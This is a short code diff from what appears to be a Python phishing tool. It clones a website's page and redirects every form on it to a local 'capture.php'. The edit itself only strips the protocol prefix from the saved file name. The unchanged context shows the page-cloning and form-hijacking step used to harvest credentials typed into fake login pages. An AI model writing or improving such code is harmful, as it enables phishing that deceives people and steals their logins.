@@ -14,7 +14,7 @@ def newtemplate(site):
     s = BeautifulSoup(r.text, 'html.parser')
     for i in s.find_all('form'):
         i['action'] = 'capture.php'
-    with open(p('WebPages/' + site), 'w') as f:
+    with open(p('WebPages/' + site.replace('https://', 'http://').replace('http://', '')), 'w') as f:
         f.write(s.prettify())
     return True
 def p(rel):
